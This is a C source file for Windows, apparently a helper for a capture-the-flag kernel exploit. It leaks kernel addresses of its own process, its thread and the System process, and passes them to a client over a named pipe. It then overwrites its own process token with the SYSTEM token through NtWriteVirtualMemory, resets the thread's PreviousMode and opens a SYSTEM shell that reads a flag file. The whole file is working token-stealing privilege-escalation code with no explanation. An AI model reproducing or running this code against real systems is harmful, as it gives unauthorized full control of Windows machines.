﻿#include <stdio.h>
#include <windows.h>
#include <winternl.h>

#pragma comment (lib, "ntdll")

#define SystemModuleInformation			(0x0b)
#define SystemHandleInformation			(0x10)
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)

#pragma pack(1)
typedef struct {
	ULONG64 hHelper; // HANDLE of Process Helper

	ULONG64 hThread; // HANDLE of Thread
	ULONG64 kEThread; // address of _ETHREAD of hThread

	ULONG64 kSystemEProcess; // address of _EPROCESS of system process
	ULONG64 kSelfEProcess; // address of _EPROCESS of hHelper
} HelperStruct;
#pragma pack()
HelperStruct* helper;

HANDLE hPipe;
ULONG step = 0;

typedef struct _SYSTEM_MODULE_ENTRY
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG Count;
	SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;


void GetAddress() {
	DWORD CurPid = GetCurrentProcessId();
	helper->hHelper = CurPid;

	HANDLE hSelf = OpenProcess(PROCESS_QUERY_INFORMATION, 0, CurPid);
	if (hSelf == INVALID_HANDLE_VALUE || hSelf == NULL) {
		wprintf(L"OpenProcess failed, err: %d\n", GetLastError());
		exit(-1);
	}
	// wprintf(L"hSelf = %p\n", hSelf);


	// Get kthread and ktoken
	SYSTEM_HANDLE_INFORMATION* HandleInfo = (SYSTEM_HANDLE_INFORMATION*)malloc(0x100);
	ULONG OutBufLen = 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, HandleInfo, 0x100, &OutBufLen);
	if (status == STATUS_INFO_LENGTH_MISMATCH) {
		free(HandleInfo);
		HandleInfo = (SYSTEM_HANDLE_INFORMATION*)malloc(OutBufLen);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, HandleInfo, OutBufLen, &OutBufLen);
	}

	if (HandleInfo == NULL) {
		wprintf(L"NtQuerySystemInformation failed, err: %d\n", GetLastError());
		exit(-1);
	}

	for (int i = 0; i < HandleInfo->NumberOfHandles; i++)
	{
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo->Handles[i];

		if (handleInfo.UniqueProcessId == CurPid)
		{
			printf_s("Handle 0x%x at 0x%p, PID: %d\n", handleInfo.HandleValue, handleInfo.Object, handleInfo.UniqueProcessId);
		}
		else
		{
			break;
		}
	}

	for (ULONG i = 0; i < HandleInfo->NumberOfHandles; i++) {
		SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleEntry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo->Handles[i];
		if (HandleEntry.UniqueProcessId == CurPid && HandleEntry.HandleValue == helper->hThread) {
			if (helper->hThread == (ULONG64)HandleEntry.HandleValue) {
				helper->kEThread = (ULONG64)HandleEntry.Object;
				wprintf(L"handle = 0x%llx, ThreadObject = 0x%llx\n", helper->hThread, helper->kEThread);
				// free(HandleInfo);
				// break;
			}
		}

		if (HandleEntry.UniqueProcessId == CurPid && HandleEntry.HandleValue == (ULONG64)hSelf) {
			helper->kSelfEProcess = (ULONG64)HandleEntry.Object;
			wprintf(L"handle = %p, Self _EPROCESS = 0x%llx\n", hSelf, helper->kSelfEProcess);
		}


		if (HandleEntry.UniqueProcessId == 4 && HandleEntry.HandleValue == 0x4) { // SYSTEM Process has a handle to itself
			helper->kSystemEProcess = (ULONG64)HandleEntry.Object;
			wprintf(L"System _EPROCESS = 0x%llx\n", helper->kSystemEProcess);
		}

		if (helper->kEThread != 0 && helper->kSystemEProcess != 0 && helper->kSelfEProcess) {
			free(HandleInfo);
			break;
		}
	}
	// Get kthread and ktoken

	if (helper->kEThread == 0 || helper->kSystemEProcess == 0 || helper->kSelfEProcess == 0) {
		wprintf(L"Retrieve addresses failed!\n");
		exit(-1);
	}

}

void Escalate();
DWORD WINAPI ThreadExploit(LPVOID lparam) {
	while (1) {
		if (step == 1) {
			break;
		}
		Sleep(1000);
	}
	Escalate();

	step = 2;
	return 0;
}



void Setup() {
	hPipe = CreateNamedPipe(
		L"\\\\.\\pipe\\pipe_helper",
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		1,
		1024 * 16,
		1024 * 16,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL
	);
	if (hPipe == INVALID_HANDLE_VALUE) {
		wprintf(L"CreateNamedPipe failed, err: %d\n", GetLastError());
		exit(-1);
	}


	// wprintf(L"sizeof(HelperStruct) == 0x%llx\n", sizeof(HelperStruct));
	helper = (HelperStruct*)malloc(sizeof(HelperStruct));
	if (helper == NULL) {
		wprintf(L"malloc failed, err: %d\n", GetLastError());
		exit(-1);
	}
	memset(helper, 0, sizeof(HelperStruct));

	helper->hThread = (ULONG64)CreateThread(0, 0, ThreadExploit, 0, 0, 0);
	if (helper->hThread == (ULONG64)INVALID_HANDLE_VALUE || helper->hThread == 0) {
		wprintf(L"CreateThread failed, err: %d\n", GetLastError());
		exit(-1);
	}
}


void SendAddressesToClient() {
	if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
		wprintf(L"ConnectNamedPipe failed, err: %d\n", GetLastError());
		exit(-1);
	}
	DWORD BytesWritten;
	if (!WriteFile(hPipe, helper, sizeof(HelperStruct), &BytesWritten, NULL)) {
		wprintf(L"WriteFile failed, err: %d\n", GetLastError());
		exit(-1);
	}
	free(helper);
}

void MonitorClient() {
	UCHAR x;
	DWORD ReadBytes;
	if (!ReadFile(hPipe, &x, sizeof(x), &ReadBytes, 0)) {
		wprintf(L"ReadFile(hPipe) failed, err: %d\n", GetLastError());
		exit(-1);
	}
	if (x == 'X') {
		wprintf(L"Let's try it!\n");
		step = 1;
	}
}

void ClosePipe() {
	DisconnectNamedPipe(hPipe);
	CloseHandle(hPipe);
}

void Escalate() {
	typedef NTSTATUS(WINAPI* NtWriteVirtualMemory_t) (
		_In_ HANDLE ProcessHandle,
		_In_ PVOID BaseAddress,
		_In_ PVOID Buffer,
		_In_ ULONG NumberOfBytesToWrite,
		_Out_opt_ PULONG NumberOfBytesWritten
		);

	HMODULE hntdll = LoadLibrary(L"ntdll.dll");
	if (hntdll == NULL) {
		wprintf(L"LoadLibrary(ntdll) failed, err: %d\n", GetLastError());
		exit(-1);
	}
	NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hntdll, "NtWriteVirtualMemory");
	if (NtWriteVirtualMemory == NULL) {
		wprintf(L"GetProcAddress(NtWriteVirtualMemory) failed, err: %d\n", GetLastError());
		exit(-1);
	}
	HANDLE hCur = GetCurrentProcess();

	DWORD BytesWritten = 0;
	ULONG64 Token[] = { 0, 0, 0, 0 };
	if (!NtWriteVirtualMemory(
		hCur,
		&Token,
		(PVOID)(helper->kSystemEProcess + 0x4b8 - 0x10), //   +0x4b8 Token            : _EX_FAST_REF; why -0x10?
		sizeof(Token),
		&BytesWritten
	)) {
		// wprintf(L"NtWriteVirtualMemory failed, err: %d\n", GetLastError());
		// exit(-1);
	}
	if (BytesWritten == 0) {
		wprintf(L"exploit failed, please reboot...\n");
		exit(-1);
	}
	wprintf(L"read %d bytes from 0x%llx, content: 0x%llx 0x%llx 0x%llx 0x%llx\n", BytesWritten, helper->kSystemEProcess + 0x4b8 - 0x10, Token[0], Token[1], Token[2], Token[3]);

	if (NtWriteVirtualMemory(
		hCur,
		(PVOID)(helper->kSelfEProcess + 0x4b8),
		&Token[2],
		8,
		&BytesWritten
	)) {
		// wprintf(L"NtWriteVirtualMemory failed, err: %d\n", GetLastError());
		// exit(-1);
	}

	Sleep(1000);
	BYTE PreviousMode = 1;
	if (NtWriteVirtualMemory(
		hCur,
		(PVOID)(helper->kEThread + 0x232),
		&PreviousMode,
		1,
		&BytesWritten
	)) {
		// wprintf(L"NtWriteVirtualMemory failed, err: %d\n", GetLastError());
		// exit(-1);
	}
}

int wmain() {
	Setup();
	GetAddress();
	SendAddressesToClient();

	// (void)getchar();
	MonitorClient();
	ClosePipe();

	while (step != 2) {
		Sleep(1000);
	}
	system("cmd.exe /c whoami");
	system("type C:\\Windows\\win.ini");
	system("type C:\\flag.txt");
	system("cmd.exe");

	return 0;
}